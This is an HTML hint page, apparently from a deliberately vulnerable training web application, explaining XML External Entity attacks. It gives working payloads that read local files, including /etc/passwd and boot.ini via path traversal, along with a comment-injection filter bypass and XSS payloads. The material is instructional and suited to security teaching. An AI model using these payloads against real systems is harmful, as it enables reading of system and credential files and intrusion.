			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			XML External Entity Attack may result when an application allows
			an input parameter to be XML or incorporated into XML
			which is passed to an XML parser running with sufficient
			privileges to include external or system files.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			Attempt to inject XML or reserved characters into input
			parameters and observe if XML parsing errors are
			generated.
			<br/><br/>
			For web services, check each input parameter specified in the
			WSDL document for those of type XML.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			Use information disclosed in error messages to determine at what
			file path the XML parser is parsing. Cause errors to occur using
			malformed XML, XML that starts with whitespace or null characters,
			and XML that does not meet the XSL specification.
			<br/><br/>
			Also try to load files that dont exist in order to determine operating system type
			and the path at which interpretation is taking place.
			<br/><br/>
			For examples, see the XML Entity Attack example
			<br/><br/>
			<span class="report-header">Example</span>
			<br/><br/>
			XML is well-known for containing data (text nodes) which are marked-up by
			tags (element nodes). XML has the ability to have place-holders called entities.
			Web developers often used pre-defined entities without realizing they are using
			an XML entity. For example the less than symbol &lt; can be represented by the
			pre-defined entity &amp;lt;. The &amp;lt; entity is defined in the parser itself.
			There is no need to declare the &amp;lt; before using it. However developers
			are allowed to declare their own entities. XML documents also contain a mechanism
			by which they can import and include external files as part of themselves. The
			imported file will be included into the XML docment whereever the entity exists.
			<br/><br/>
			Here are some examples to try
			<br/><br/>
			Valid XML without entities
			<br/>
<code>
	&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;Hello World&lt;/text&gt;&lt;/change-log&gt;
</code>
			<br/>
			XML with the predefined &amp;quot; entity
			<br/><br/>
<code>
	&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;<span class="important-code">&amp;quot;</span>Hello World<span class="important-code">&amp;quot;</span>&lt;/text&gt;&lt;/change-log&gt;
</code>
			<br/>
			XML with the user defined myEntity entity
			<br/><br/>
<code>
	&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE change-log[ <span class="important-code">&lt;!ENTITY myEntity &quot;World&quot;&gt;</span> ]&gt;&lt;change-log&gt;&lt;text&gt;Hello <span class="important-code">&amp;myEntity;</span>&lt;/text&gt;&lt;/change-log&gt;
</code>
			<br/>
			XML with multiple user defined entities
			<br/><br/>
<code>
	&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE change-log[ <span class="important-code">&lt;!ENTITY myEntity &quot;World&quot;&gt;&lt;!ENTITY myQuote &quot;&amp;quot;&quot;&gt;</span> ]&gt;&lt;change-log&gt;&lt;text&gt;<span class="important-code">&amp;myQuote;</span>Hello <span class="important-code">&amp;myEntity;&amp;myQuote;</span>&lt;/text&gt;&lt;/change-log&gt;
</code>
			<br/>
			The &lt;!ENTITY&gt; section of an XML document optionally defines external
			files to be included as part of the XML document. Interestingly these can even
			be files from the system parsing the XML.
			<br/><br/>
			To declare an external entity, the &lt;!ENTITY&gt; directive defines the resource
			represented and the symbol that will represent the entity. In this example, the type
			of entity is a local system resource as indicated by the "SYSTEM" type, the resource
			is a local file (./robots.txt), and the symbol that represents the entity is
			"systemEntity". Entities do not have to be external but in this example the system
			file happens to be an external resource. Entities can also be strings or other
			local variables.
			<br/><br/>
<code>
	<span class="important-code">&lt;!ENTITY systemEntity SYSTEM &quot;robots.txt&quot;&gt;</span>
</code>
			<br/>
			The XML parser will import the file. The file can be output into the XML document by
			placing the symbol in the document preceded by an ampersand (&amp;) and followed by
			a semicolon (;).
			<br/>
<code>
	&lt;change-log&gt;
		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;
	&lt;/change-log&gt;
</code>
			<br/>
			In an external entity attack, XML is injected or uploaded to the site in an effort to
			get the XML parser import the injected entity into the XML, then output the
			contents of the entity.
			<br/>
<code>
	&lt;?xml version=&quot;1.0&quot;?&gt;
	&lt;!DOCTYPE change-log [
		<span class="important-code">&lt;!ENTITY systemEntity SYSTEM &quot;robots.txt&quot;&gt;</span>
	]&gt;
	&lt;change-log&gt;
		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;
	&lt;/change-log&gt;
</code>
			<br/>
			If the web server is misconfigured or given too many privileges, the XML parser can
			import operating system files. This example works on many Windows systems.
			<br/>
<code>
	&lt;?xml version=&quot;1.0&quot;?&gt;
	&lt;!DOCTYPE change-log [
		<span class="important-code">&lt;!ENTITY systemEntity SYSTEM &quot;../../../../boot.ini&quot;&gt;</span>
	]&gt;
	&lt;change-log&gt;
		&lt;text&gt;<span class="important-code">&amp;systemEntity;</span>&lt;/text&gt;
	&lt;/change-log&gt;
</code>
			<br/>
			The output will look similar to the following
			<br/>
<code>
	[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /NoExecute=OptIn ;
</code>
		<br/>
		Other injections are possible. This version uses injected comment symbols to alter XML.
		This is useful for filter bypass.
		<br/>
<code>
&lt;somexml&gt;
&lt;message&gt;Hello World &amp;lt;!--&lt;/message&gt;
&lt;place&gt; NJ &lt;/place&gt;
&lt;/somexml&gt;
</code>
		<br/>
		This is a slightly different version of XXE to fetch the robots.txt.
		<br/>
<code>
&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE change-log [ &lt;!ENTITY systemEntity SYSTEM &quot;robots.txt&quot;&gt; ]&gt; &lt;change-log&gt; &lt;text&gt;&amp;systemEntity;&lt;/text&gt; &lt;/change-log&gt;
</code>
		<br/>
		This example of XXE uses a slightly different syntax to fetch the passwd file on Linux systems (Credit: Robin @digininja Wood)
		<br/>
<code>
&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot; ?&gt;&lt;!DOCTYPE demo [&lt;!ELEMENT demo (#PCDATA)&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;a&gt;&lt;inject&gt;&amp;xxe;&lt;/inject&gt;&lt;/a&gt;
</code>

		<br/>
		This injection results in a cross site script.
		<br/>
<code>
&lt;test&gt; $lDOMDocument-&gt;textContent=&lt;![CDATA[&lt;]]&gt;script&lt;![CDATA[&gt;]]&gt;alert(&#39;XSS&#39;)&lt;![CDATA[&lt;]]&gt;/script&lt;![CDATA[&gt;]]&gt; &lt;/test&gt;
</code>
		<br/>
		This injection also results in a cross site script.
		<br/>
<code>
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;change-log&gt;&lt;text&gt;&amp;lt;script&amp;gt;alert(&amp;quot;Hello World&amp;quot;)&amp;lt;/script&amp;gt;&lt;/text&gt;&lt;/change-log&gt;
</code>
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<br/><br/>